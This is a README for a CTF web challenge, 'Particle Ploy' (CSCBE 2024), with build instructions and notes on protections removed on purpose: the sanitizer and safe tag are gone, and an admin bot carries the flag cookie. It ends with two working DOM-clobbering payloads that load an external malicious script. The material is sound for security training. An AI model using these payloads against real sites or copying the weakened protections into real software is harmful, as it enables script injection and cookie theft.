# Particle Ploy
https://publications.cispa.saarland/3756/1/sp23_domclob.pdf

A CTF challenge for the 2024 CSCBE competition

- particles: https://github.com/marcbruederlin/particles.js?tab=readme-ov-file
- layout: https://github.com/kevquirk/simple.css
- club-mate: https://club-mate.be/
- database: https://flask.palletsprojects.com/en/3.0.x/patterns/sqlite3/
- forms: https://wtforms.readthedocs.io/en/3.1.x/crash_course/

## Production

    docker build -t particle-ploy . && docker run --rm -p 127.0.0.1:8080:8080 particle-ploy

## Development

### Webserver

        cd app
        python -m pip install -r requirements.txt
        python -m flask --app app --debug run

OR

        docker compose up --build

### Admin checker

        cd admin-simulation
        python -m pip install -r requirements.txt
        python main.py


Go to `localhost:8080`


remove safe tag
remove sanitizer
CSP header -> strict-dynamic
admin visiting script -> add flag in cookie

## Working payload

```
</p><body id="custom_particles">http://127.0.0.1:4321/malicious.js</body>
<style>h1,p{display:none;}</style>
```

```
</p><html id="custom_particles" class="x">http://127.0.0.1:4321/malicious.js</html>
<style>h1,p{display:none;}</style>
```